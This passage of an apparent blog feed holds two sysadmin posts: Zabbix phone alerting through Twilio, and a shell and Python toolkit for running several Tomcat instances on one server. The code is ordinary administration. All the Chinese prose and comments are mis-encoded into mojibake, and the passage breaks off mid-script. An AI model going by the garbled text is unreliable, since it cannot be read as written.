class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> twilio.rest <span class="keyword">import</span> Client</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Your Account Sid and Auth Token from twilio.com/console</span></div><div class="line marked">account_sid = <span class="string">'your_sid'</span></div><div class="line marked">auth_token = <span class="string">'your_token'</span></div><div class="line">client = Client(account_sid, auth_token)</div><div class="line"></div><div class="line"></div><div class="line">call = client.calls.create(</div><div class="line">                        url=<span class="string">'https://demo.twilio.com/welcome/voice/'</span>,</div><div class="line">                        <span class="comment">#æ³¨å†Œä½¿ç”¨çš„æ‰‹æœºå·</span></div><div class="line marked">                        to=<span class="string">'+8611111'</span>,</div><div class="line">                        <span class="comment">#ä¸Šé¢è·å–åˆ°çš„ç½‘ç»œç”µè¯å·ç </span></div><div class="line marked">                        from_=<span class="string">'+19387770820'</span></div><div class="line">                    )</div><div class="line">print(call.sid)</div></pre></div></div></figure><p>æ‰§è¡Œæ–‡ä»¶æµ‹è¯•, è¿”å›ä¸€æ®µidè¡¨ç¤ºæˆåŠŸ, æ¥åˆ°ç”µè¯</p><p><img src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_phone.png" alt="kionf"></p><p><br></p><hr><p><br></p><h1 id="0x02-é…ç½®zabbix"><a href="#0x02-é…ç½®zabbix" class="headerlink" title="0x02 é…ç½®zabbix"></a>0x02 é…ç½®zabbix</h1><h2 id="1-æ·»åŠ æŠ¥è­¦åª’ä»‹"><a href="#1-æ·»åŠ æŠ¥è­¦åª’ä»‹" class="headerlink" title="1. æ·»åŠ æŠ¥è­¦åª’ä»‹"></a>1. æ·»åŠ æŠ¥è­¦åª’ä»‹</h2><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_05.png" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><h2 id="2-è¿æ¥åˆ°ç”¨æˆ·"><a href="#2-è¿æ¥åˆ°ç”¨æˆ·" class="headerlink" title="2. è¿æ¥åˆ°ç”¨æˆ·"></a>2. è¿æ¥åˆ°ç”¨æˆ·</h2><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_06.png" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><h2 id="3-æ·»åŠ åˆ°åŠ¨ä½œ"><a href="#3-æ·»åŠ åˆ°åŠ¨ä½œ" class="headerlink" title="3. æ·»åŠ åˆ°åŠ¨ä½œ"></a>3. æ·»åŠ åˆ°åŠ¨ä½œ</h2><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_images/zabbix_alert_phone/zabbix_alert_07.png" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><div class="note success"><p>è‡³æ­¤<code>zabbix</code>ç”µè¯æŠ¥è­¦é…ç½®å®Œæˆ, å¦‚æœéœ€è¦å…è´¹æ‰“ç»™å¤šä¸ªç”¨æˆ·, å¯ä»¥æ³¨å†Œå¤šä¸ªè´¦å·,æ·»åŠ å¤šä¸ªåª’ä»‹ ç„¶å ç»‘å®šåˆ°åŒä¸€ä¸ªåŠ¨ä½œä¸­. </p></div>]]></content>
      
      <categories>
          
          <category> è‡ªåŠ¨åŒ–è¿ç»´ </category>
          
          <category> Zabbix </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Zabbix </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Tomcatå•æœºå¤šå®ä¾‹éƒ¨ç½²åŠç®¡ç†</title>
      <link href="/2018/06/28/tomcat-multiple/"/>
      <url>/2018/06/28/tomcat-multiple/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/tobin01.jpg" alt="å‚²è§†ç¾¤é›„"></p><blockquote class="blockquote-center"><p>å•å°æœºå™¨éƒ¨ç½²å¤šä¸ª Tomcat, æ¯ä¸ªTomcatéƒ¨ç½²ç‹¬ç«‹æœåŠ¡,Tomcatä¹‹é—´å¯åœäº’ä¸å½±å“</p></blockquote><a id="more"></a><p>ä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆæœ‰è¿™ä¸ªéœ€æ±‚, å¤åˆ¶ç²˜è´´å°±æ˜¯å¹²</p><hr><h1 id="0x00-å•æœºå¤šå®ä¾‹æ¦‚è¿°"><a href="#0x00-å•æœºå¤šå®ä¾‹æ¦‚è¿°" class="headerlink" title="0x00 å•æœºå¤šå®ä¾‹æ¦‚è¿°"></a>0x00 å•æœºå¤šå®ä¾‹æ¦‚è¿°</h1><p><img src="https://kionf.com/article_images/tomcat-multiple.png" alt="kionf"></p><p>å¤§æ¦‚çš„ç›®å½•ç»“æ„:</p><ul><li><code>CATALINA_HOME</code> ä¸ºTomcatåº”ç”¨ç¨‹åºè¿è¡Œç¨‹åºåŠæ‰€éœ€ä¾èµ–</li><li><code>CATALINA_BASE</code> å³æˆ‘ä»¬å³å°†éƒ¨ç½²çš„ç¨‹åº</li></ul><blockquote><p><strong>æ‰‹åŠ¨æ›´æ”¹å¦‚ä¸‹å·¥ä½œç›®å½•:</strong></p></blockquote><figure class="highlight sh"><figcaption><span class="caption">è¿™æ˜¯æˆ‘è‡ªå·±ä¸ªå„¿æ•´çš„åˆå§‹ç›®å½•ç»“æ„</span><a href="https://github.com/kalivim/Script/raw/master/Tomcat%E5%8D%95%E6%9C%BA%E5%A4%9A%E5%AE%9E%E4%BE%8B%E7%AE%A1%E7%90%86/INIT_APPS_FILE.tar.gz" download="" target="_blank" rel="noopener"><i class="fa fa-download" aria-hidden="true"></i> download</a></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">war_apps<span class="comment">#æ‰‹åŠ¨åˆ›å»ºç”¨æ¥å­˜æ”¾ä¸‹è½½å¥½çš„waråŒ…æ–‡ä»¶</span></div><div class="line">tomcat<span class="comment">#CATALINA_HOME</span></div><div class="line">â”œâ”€â”€ bin</div><div class="line">â”œâ”€â”€ INIT_APPS_FILE<span class="comment">#CATALINA_BASE</span></div><div class="line">â”‚Â Â  â”œâ”€â”€ conf</div><div class="line">â”‚Â Â  â”œâ”€â”€ logs</div><div class="line">â”‚Â Â  â”œâ”€â”€ temp</div><div class="line">â”‚Â Â  â”œâ”€â”€ webapps</div><div class="line">â”‚Â Â  â””â”€â”€ work</div><div class="line">â””â”€â”€ lib</div></pre></div></div></figure><p>ç„¶åå‘¢æ­£å¸¸çš„æ€è·¯å°±æ˜¯é…ç½®æ¯ä¸ªAPPçš„<code>server.xml</code>ç«¯å£:</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">- Server Portï¼šè¯¥ç«¯å£ç”¨äºç›‘å¬å…³é—­tomcatçš„shutdownå‘½ä»¤ï¼Œé»˜è®¤ä¸º8005</div><div class="line">- Connector Portï¼šè¯¥ç«¯å£ç”¨äºç›‘å¬HTTPçš„è¯·æ±‚ï¼Œé»˜è®¤ä¸º8080</div><div class="line">- AJP Portï¼šè¯¥ç«¯å£ç”¨äºç›‘å¬AJPï¼ˆ Apache JServ Protocol ï¼‰åè®®ä¸Šçš„è¯·æ±‚ï¼Œé€šå¸¸ç”¨äºæ•´åˆApache Serverç­‰å…¶ä»–HTTPæœåŠ¡å™¨ï¼Œé»˜è®¤ä¸º8009</div><div class="line">- Redirect Portï¼šé‡å®šå‘ç«¯å£ï¼Œå‡ºç°åœ¨Connectoré…ç½®ä¸­ï¼Œå¦‚æœè¯¥Connectorä»…æ”¯æŒéSSLçš„æ™®é€šhttpè¯·æ±‚ï¼Œé‚£ä¹ˆè¯¥ç«¯å£ä¼šæŠŠ https çš„è¯·æ±‚è½¬å‘åˆ°è¿™ä¸ªRedirect PortæŒ‡å®šçš„ç«¯å£ï¼Œé»˜è®¤ä¸º8443ï¼›</div></pre></div></div></figure><p>åº”ç”¨å¤ªå¤šä½ éš¾é“è¦ä¸€ä¸ªä¸ªæ‰‹åŠ¨æ”¹? no  no <strong>no!</strong> ä¸Šè„šæœ¬</p><hr><h1 id="0x01-è‡ªåŠ¨éƒ¨ç½²ç®¡ç†é…ç½®"><a href="#0x01-è‡ªåŠ¨éƒ¨ç½²ç®¡ç†é…ç½®" class="headerlink" title="0x01 è‡ªåŠ¨éƒ¨ç½²ç®¡ç†é…ç½®"></a>0x01 è‡ªåŠ¨éƒ¨ç½²ç®¡ç†é…ç½®</h1><p>éœ€è¦æŠŠåº”ç”¨waråŒ…ä¼ åˆ°å¯ä¸‹è½½ä½ç½®,æ¥ç”¨äºåº”ç”¨åˆ†å‘,æˆ‘è¿™é‡Œæ˜¯ç›´æ¥ä¼ åˆ°äº†é˜¿é‡Œäº‘çš„ossæ¡¶é‡Œ</p><h2 id="1-æ·»åŠ tomcatæ›´æ–°å¯åœæ§åˆ¶è„šæœ¬"><a href="#1-æ·»åŠ tomcatæ›´æ–°å¯åœæ§åˆ¶è„šæœ¬" class="headerlink" title="1.æ·»åŠ tomcatæ›´æ–°å¯åœæ§åˆ¶è„šæœ¬"></a>1.æ·»åŠ tomcatæ›´æ–°å¯åœæ§åˆ¶è„šæœ¬</h2><div class="note danger"><p>éœ€è¦å®‰è£…unzip <code>yum -y install unzip</code> </p></div><figure class="highlight sh"><figcaption><span class="caption">manage.shéœ€è¦æ”¾åœ¨è¿™é‡Œ,ä¹Ÿå¯ä»¥è‡ªå®šä¹‰æ”¹ä»£ç </span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">war_apps<span class="comment">#æ‰‹åŠ¨åˆ›å»ºç”¨æ¥å­˜æ”¾ä¸‹è½½å¥½çš„waråŒ…æ–‡ä»¶</span></div><div class="line">tomcat<span class="comment">#CATALINA_HOME</span></div><div class="line">â”œâ”€â”€ bin</div><div class="line diff-addition">â”œâ”€â”€ manage.sh</div><div class="line">â”œâ”€â”€ INIT_APPS_FILE<span class="comment">#CATALINA_BASE</span></div><div class="line">â”‚Â Â  â”œâ”€â”€ conf</div><div class="line">â”‚Â Â  â”œâ”€â”€ logs</div><div class="line">â”‚Â Â  â”œâ”€â”€ temp</div><div class="line">â”‚Â Â  â”œâ”€â”€ webapps</div><div class="line">â”‚Â Â  â””â”€â”€ work</div><div class="line">â””â”€â”€ lib</div></pre></div></div></figure><blockquote><p>è“è‰²å—éœ€è¦æ ¹æ®å®é™…æƒ…å†µè‡ªå®šä¹‰, <strong>åº”ç”¨åç§°, å’ŒwaråŒ…ä¸‹è½½åœ°å€ä¸éœ€è¦å†™,åé¢çš„pythonæ€»æ§åˆ¶å°ä¼šè‡ªåŠ¨åˆ†é…</strong></p></blockquote><figure class="highlight sh"><figcaption><span class="caption">manage</span><span class="suffix">.sh</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"><span class="comment"># Author: Kionf</span></div><div class="line"><span class="comment"># description: å¯åŠ¨tomcatå¤šå®ä¾‹.</span></div><div class="line"><span class="comment"># PATH=/opt/op/java/jdk1.8.0_172/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span></div><div class="line"><span class="comment"># åº”ç”¨åç§°</span></div><div class="line">app=</div><div class="line"></div><div class="line"><span class="comment"># waråŒ…ä¸‹è½½åœ°å€</span></div><div class="line">war_url=</div><div class="line"></div><div class="line marked">soft_dir=<span class="string">"/opt/op"</span></div><div class="line">download_war_file=<span class="string">"<span class="variable">$&#123;soft_dir&#125;</span>/war_apps/<span class="variable">$&#123;app&#125;</span>.war"</span></div><div class="line"></div><div class="line"><span class="built_in">export</span> CATALINA_BASE=<span class="string">"<span class="variable">$&#123;soft_dir&#125;</span>/tomcat/<span class="variable">$app</span>"</span></div><div class="line"><span class="built_in">export</span> CATALINA_HOME=<span class="string">"<span class="variable">$&#123;soft_dir&#125;</span>/tomcat"</span></div><div class="line marked"><span class="built_in">export</span> JVM_OPTIONS=<span class="string">"-Xms528m -Xmx812m -Xmn328m"</span></div><div class="line"></div><div class="line">[ -d <span class="string">"<span class="variable">$&#123;soft_dir&#125;</span>/war_apps"</span> ] || mkdir <span class="variable">$&#123;soft_dir&#125;</span>/war_apps</div><div class="line"></div><div class="line">[ `<span class="built_in">which</span> unzip` ] || yum -y -q install unzip &gt;/dev/null 2&gt;&amp;1</div><div class="line"></div><div class="line"><span class="function"><span class="title">check</span></span>()&#123;</div><div class="line">    PID=`ps aux|grep java|grep -w <span class="variable">$&#123;CATALINA_BASE&#125;</span>|awk <span class="string">'&#123;print $2&#125;'</span>`</div><div class="line">    <span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$PID</span>"</span> ];<span class="keyword">then</span></div><div class="line">        <span class="built_in">echo</span> -e <span class="string">"\033[94m <span class="variable">$app</span> is running PID:<span class="variable">$PID</span>"</span></div><div class="line">        running=`netstat -ntlp|grep <span class="variable">$PID</span>|grep 127.0.0.1`</div><div class="line">        <span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$running</span>"</span> ];<span class="keyword">then</span></div><div class="line">            <span class="built_in">echo</span> -e <span class="string">"\033[92m <span class="variable">$app</span> is provide services\033[0m "</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="built_in">echo</span> -e <span class="string">"\033[93m <span class="variable">$app</span> is running but not provide services\033[0m"</span></div><div class="line">        <span class="keyword">fi</span></div><div class="line">        <span class="built_in">return</span> 0</div><div class="line"></div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">echo</span> -e <span class="string">"\033[91m <span class="variable">$app</span> is dead\033[0m "</span></div><div class="line">        <span class="built_in">return</span> 1</div><div class="line">    <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">start</span></span>() &#123;</div><div class="line">    check</div><div class="line">    <span class="keyword">if</span> [ $? -eq 1 ];<span class="keyword">then</span></div><div class="line">        <span class="built_in">echo</span> -e <span class="string">"\033[94m Start <span class="variable">$app</span> \033[0m"</span></div><div class="line">        <span class="variable">$CATALINA_HOME</span>/bin/startup.sh &gt;/dev/null 2&gt;&amp;1</div><div class="line">    <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">stop</span></span>() &#123;</div><div class="line">    check</div><div class="line">    <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></div><div class="line">        <span class="built_in">echo</span> -e <span class="string">"\033[94m Stop <span class="variable">$app</span>\033[0m"</span></div><div class="line">        <span class="variable">$CATALINA_HOME</span>/bin/shutdown.sh &gt;/dev/null 2&gt;&amp;1</div><div class="line">        <span class="built_in">kill</span> -9 <span class="variable">$PID</span></div><div class="line">    <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">update</span></span>() &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"ä¸‹è½½æ–‡ä»¶"</span></div><div class="line">    wget <span class="variable">$&#123;war_url&#125;</span> -O <span class="variable">$&#123;download_war_file&#125;</span> &gt; /dev/null 2&gt;&amp;1</div><div class="line">    <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></div><div class="line">        <span class="built_in">cd</span> <span class="variable">$&#123;CATALINA_BASE&#125;</span>/webapps/*/; unzip -q -o <span class="variable">$&#123;download_war_file&#125;</span> &gt;/dev/null 2&gt;&amp;1</div><div class="line">    <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">log</span></span>() &#123;</div><div class="line">    tailf <span class="variable">$&#123;CATALINA_BASE&#125;</span>/logs/catalina.out</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> != <span class="string">"0"</span> ];<span class="keyword">then</span></div><div class="line">    <span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></div><div class="line">        start)</div><div class="line">            start</div><div class="line">            ;;</div><div class="line">        stop)</div><div class="line">            stop</div><div class="line">            ;;</div><div class="line">        restart)</div><div class="line">            stop</div><div class="line">            start </div><div class="line">            ;;</div><div class="line">        status)</div><div class="line">            check</div><div class="line">            ;;</div><div class="line">        upgrade)</div><div class="line">            stop</div><div class="line">            update</div><div class="line">            start</div><div class="line">            ;;</div><div class="line">        <span class="built_in">log</span>)</div><div class="line">            <span class="built_in">log</span></div><div class="line">            ;;</div><div class="line">        *)</div><div class="line">            <span class="built_in">echo</span> $<span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|restart|status|upgrade|log&#125;"</span></div><div class="line">            <span class="built_in">exit</span> 1</div><div class="line">            ;;</div><div class="line">    <span class="keyword">esac</span></div><div class="line"><span class="keyword">else</span></div><div class="line">    start</div><div class="line">    <span class="built_in">log</span></div><div class="line"><span class="keyword">fi</span></div></pre></div></div></figure><hr><h2 id="2-æ·»åŠ æ€»æ§åˆ¶å°è„šæœ¬"><a href="#2-æ·»åŠ æ€»æ§åˆ¶å°è„šæœ¬" class="headerlink" title="2.æ·»åŠ æ€»æ§åˆ¶å°è„šæœ¬"></a>2.æ·»åŠ æ€»æ§åˆ¶å°è„šæœ¬</h2><blockquote><p>æˆ‘å°±æ”¾åœ¨äº†<code>/usr/local/bin</code>ä¸‹, <code>chmod +x /usr/local/bin/tomcat_manager</code> è“è‰²éƒ¨åˆ†éœ€è¦æ ¹æ®è‡ªå·±éœ€æ±‚æ›´æ”¹ (æ”¯æŒpython2)</p></blockquote><figure class="highlight python"><figcaption><span class="fileDir">/usr/local/bin/</span><span class="caption">tomcat_manager</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Time    : 2018/5/23 15:18</span></div><div class="line"><span class="comment"># @Author  : Kionf</span></div><div class="line"><span class="comment"># @FileName: tomcat_manager.py</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#   åˆå§‹é…ç½®å¹¶ç®¡ç†å•ä¾‹tomcatå¤šåº”ç”¨</span></div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> shutil</div><div class="line"></div><div class="line"><span class="comment"># PATH = os.getcwd()</span></div><div class="line marked">PATH = <span class="string">"/opt/op/tomcat"</span><span class="comment">#Tomcatç›®å½•</span></div><div class="line marked">shell_script = os.path.join(PATH, <span class="string">"manage.sh"</span>)<span class="comment">#æ›´æ–°å¯åœç®¡ç†è„šæœ¬</span></div><div class="line">INIT_FILES = os.path.join(PATH, <span class="string">"INIT_APPS_FILE"</span>)</div><div class="line marked">bucket = <span class="string">"https://oss.aliyuncs.com/tomcat_app/"</span><span class="comment"># webappä¸‹è½½åœ°å€</span></div><div class="line"></div><div class="line">config_data = &#123;</div><div class="line">    <span class="comment"># åº”ç”¨å: [ServerPort, ConnectPort, AJPPort, RedirectPort, ]</span></div><div class="line marked">    <span class="string">'Application'</span>: [<span class="string">'8201'</span>, <span class="string">'8101'</span>, <span class="string">'8301'</span>, <span class="string">'8401'</span>, <span class="string">'BaseApplication.war'</span>],</div><div class="line marked">    <span class="string">'BaseNotify_Service'</span>: [<span class="string">'8202'</span>, <span class="string">'8102'</span>, <span class="string">'8302'</span>, <span class="string">'8402'</span>, <span class="string">'BaseNotify_Service.war'</span>],</div><div class="line marked">    <span class="string">'BaseUserCenter_Service'</span>: [<span class="string">'8203'</span>, <span class="string">'8103'</span>, <span class="string">'8303'</span>, <span class="string">'8403'</span>, <span class="string">'BaseUserCenter_Service.war'</span>],</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">customize_print</span><span class="params">(msg, stat=<span class="number">0</span>)</span>:</span></div><div class="line">    <span class="keyword">if</span> stat == <span class="number">1</span>:</div><div class="line">        print(<span class="string">"\033[91m [ERROR]:  %s \033[0m"</span> % msg)</div><div class="line">    <span class="keyword">elif</span> stat == <span class="number">0</span>:</div><div class="line">        print(<span class="string">"\033[92m [INFO]:  %s \033[0m"</span> % msg)</div><div class="line">    <span class="keyword">elif</span> stat == <span class="number">2</span>:</div><div class="line">        print(<span class="string">"\033[93m [DEBUG]:  %s \033[0m"</span> % msg)</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">TomcatAppsManage</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, webapp)</span>:</span></div><div class="line">        self.name = webapp</div><div class="line">        self.app_config = config_data[self.name]</div><div class="line">        self.manage_shell_file = os.path.join(PATH, self.name, self.name)</div><div class="line">        self.server_port, self.conn_port, self.ajp_port, self.redirect_port, self.app_war_name = self.app_config</div><div class="line">        self.app_download_url = bucket + self.app_war_name</div><div class="line">        self.config_file = os.path.join(PATH, self.name, <span class="string">'conf/server.xml'</span>)</div><div class="line">        self.webapp_dir = os.path.join(PATH, self.name)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        åˆ›å»ºapp</span></div><div class="line"><span class="string">        :return:</span></div><div class="line"><span class="string">        """</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.webapp_dir):</div><div class="line">            customize_print(<span class="string">"åˆ›å»ºAPP: %s"</span> % self.name)</div><div class="line">            shutil.copytree(INIT_FILES, self.webapp_dir)</div><div class="line">            os.mkdir(os.path.join(self.webapp_dir, <span class="string">"webapps"</span>, self.name.lower()))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">config_app_port</span><span class="params">(self)</span>:</span></div><div class="line">        customize_print(<span class="string">"æ­£åœ¨ä¿®æ”¹APPï¼š%s é…ç½®"</span> % self.name)</div><div class="line">        change_port = &#123;</div><div class="line">            <span class="string">'ServerPort'</span>: <span class="string">"sed -i s'#Server port=\"[0-9]*\"#Server port=\""</span> + self.server_port + <span class="string">"\"#'g "</span> + self.config_file,</div><div class="line">            <span class="string">'ConnPort'</span>: <span class="string">"sed -i s'#Connector port=\"[0-9]*\" protocol=\"HTTP/1.1\"#Connector port=\""</span> + self.conn_port + <span class="string">"\" protocol=\"HTTP/1.1\"#'g "</span> + self.config_file,</div><div class="line">            <span class="string">'RedirectPort'</span>: <span class="string">"sed -i s'#redirectPort=\"[0-9]*\"#redirectPort=\""</span> + self.redirect_port + <span class="string">"\"#'g "</span> + self.config_file,</div><div class="line">            <span class="string">'AjpPort'</span>: <span class="string">"sed -i s'#Connector port=\"[0-9]*\" protocol=\"AJP/1.3\"#Connector port=\""</span> + self.ajp_port + <span class="string">"\" protocol=\"AJP/1.3\"#'g "</span> + self.config_file,</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> change_port.keys():</div><div class="line">            <span class="comment"># customize_print("ä¿®æ”¹ %s ç«¯å£" % port)</span></div><div class="line">            